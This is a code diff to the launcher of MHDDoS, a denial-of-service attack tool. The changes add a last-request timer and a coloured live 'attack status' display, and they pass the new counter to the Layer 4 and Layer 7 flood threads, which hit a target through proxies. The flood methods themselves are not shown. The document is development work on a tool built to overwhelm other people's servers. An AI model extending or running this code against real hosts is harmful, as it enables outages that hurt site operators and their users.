@@ -1,3 +1,5 @@
+import ctypes
+import json
 import logging
 import os
 from _socket import gethostbyname
@@ -7,10 +9,10 @@ from os import _exit
 from pathlib import Path
 from sys import argv
 from threading import Event
+import time
+
 from PyRoxy import Tools as ProxyTools
 from blessed import Terminal
-import json
-
 from yarl import URL
 
 from MHDDoS.methods.layer_4 import Layer4
@@ -19,8 +21,9 @@ from MHDDoS.methods.methods import Methods
 from MHDDoS.methods.tools import Tools
 from MHDDoS.utils.misc import Counter
 from MHDDoS.utils.proxies import ProxyManager
-from MHDDoS.utils.text import craft_outreach_log_message
 from utils.blessed_utils import TextUtils
+
+term = Terminal()
 
 basicConfig(format='[%(asctime)s - %(levelname)s] %(message)s',
             datefmt="%H:%M:%S")
@@ -42,11 +45,18 @@ def exit(*message):
 
 
 def start():
+    global BYTES_SENT, \
+        REQUESTS_SENT, \
+        TOTAL_BYTES_SENT, \
+        TOTAL_REQUESTS_SENT, \
+        LAST_REQUEST_TIMESTAMP
+
     # COUNTERS
     REQUESTS_SENT = Counter()
     BYTES_SENT = Counter()
     TOTAL_REQUESTS_SENT = Counter()
     TOTAL_BYTES_SENT = Counter()
+    LAST_REQUEST_TIMESTAMP = Counter(value_type=ctypes.c_double)
 
     with open(__dir__ / "config.json") as f:
         config = json.load(f)
@@ -135,9 +145,8 @@ def start():
                 if rpc > 100:
                     logger.warning("RPC (Requests Per Connection) number is higher than 100")
 
-                # TODO: manage threads actively
                 for _ in range(threads):
-                    Layer7(url, host, method, rpc, event, list(uagents), list(referers), list(proxies), BYTES_SENT, REQUESTS_SENT).start()
+                    Layer7(url, host, method, rpc, event, list(uagents), list(referers), list(proxies), BYTES_SENT, REQUESTS_SENT, LAST_REQUEST_TIMESTAMP).start()
 
             if method in Methods.LAYER4_METHODS:
                 # HANDLE PARAMETERS
@@ -195,7 +204,7 @@ def start():
                             logger.setLevel("DEBUG")
 
                 for _ in range(threads):
-                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT).start()
+                    Layer4((host, port), referrers, method, event, proxies, BYTES_SENT, REQUESTS_SENT, LAST_REQUEST_TIMESTAMP).start()
 
             # start health check thread
             if not port:
@@ -218,7 +227,7 @@ def start():
             ts = time.time()
 
             while time.time() < ts + timer:
-                # log_attack_status()
+                log_attack_status()
 
                 # update request counts
                 TOTAL_REQUESTS_SENT += int(REQUESTS_SENT)
@@ -231,7 +240,7 @@ def start():
                 bps = Tools.humanbytes(int(BYTES_SENT))
                 tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
                 tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
-                logger.info(f"Total bytes sent: {tb}, total requests: {tp}")
+                # logger.info(f"Total bytes sent: {tb}, total requests: {tp}")
 
                 time.sleep(1)
 
@@ -241,7 +250,14 @@ def start():
         Tools.usage()
 
 
+BYTES_SENT = Counter()
+REQUESTS_SENT = Counter()
+TOTAL_BYTES_SENT = Counter()
+TOTAL_REQUESTS_SENT = Counter()
+LAST_REQUEST_TIMESTAMP = Counter(value_type=ctypes.c_double)
+
 term = Terminal()
+status_logging_started = False
 is_first_health_check_done = False
 last_target_health_check_timestamp = -1
 last_l4_result = None
@@ -250,27 +266,28 @@ last_l7_response = None
 last_l7_proxied_responses = None
 
 
-def log_attack_status_new():
-    global BYTES_SENT, REQUESTS_SENT, TOTAL_BYTES_SENT, TOTAL_REQUESTS_SENT, status_logging_started
+def log_attack_status():
+    global BYTES_SENT, \
+        REQUESTS_SENT, \
+        TOTAL_BYTES_SENT, \
+        TOTAL_REQUESTS_SENT, \
+        LAST_REQUEST_TIMESTAMP, \
+        status_logging_started
 
     # craft status message
     message = "\n"
     message += craft_performance_log_message()
-    # message += craft_outreach_log_message(
-    #     is_first_health_check_done,
-    #     last_target_health_check_timestamp,
-    #     last_l4_result,
-    #     last_l4_proxied_results,
-    #     last_l7_response,
-    #     last_l7_proxied_responses
-    # )
 
     # log the message
-    message = TextUtils.pad_to_itself(message)
+    message_height = TextUtils.height(message)
+    message = TextUtils.pad_to_box(message, term.width, message_height)
     message = TextUtils.truncate_to_box(message, term.width, term.height)
     height = TextUtils.height(message)
 
     if not status_logging_started:
+        spacer = "".join(["\n" for _ in range(message_height)])
+        print(spacer, end="", flush=True)
+
         status_logging_started = True
 
     with term.location(0, term.height - height - 1):
@@ -283,6 +300,24 @@ def craft_performance_log_message():
     bps = Tools.humanbytes(int(BYTES_SENT))
     tp = Tools.humanformat(int(TOTAL_REQUESTS_SENT))
     tb = Tools.humanbytes(int(TOTAL_BYTES_SENT))
+    tslr = time.time() - float(LAST_REQUEST_TIMESTAMP)
+    tslr_string = f"{tslr * 1000:.0f} ms"
+
+    color_ok = term.green
+    color_bad = term.red
+
+    if int(BYTES_SENT) == 0:
+        pps = color_bad(pps)
+        bps = color_bad(bps)
+    else:
+        pps = color_ok(pps)
+        bps = color_ok(bps)
+    if int(TOTAL_BYTES_SENT) == 0:
+        tp = color_bad(tp)
+        tb = color_bad(tb)
+    if tslr > 10:
+        tslr_string = color_bad(tslr_string)
+
     status_string = f"Status:\n" \
                     f"    Outgoing data:\n" \
                     f"       Per second:\n" \
@@ -290,7 +325,8 @@ def craft_performance_log_message():
                     f"          Bytes/s:   {bps}\n" \
                     f"       Total since the attack started:\n" \
                     f"          Packets sent: {tp}\n" \
-                    f"          Bytes sent:   {tb}\n"
+                    f"          Bytes sent:   {tb}\n" \
+                    f"    Time since last request: {tslr_string}"
 
     return status_string
 
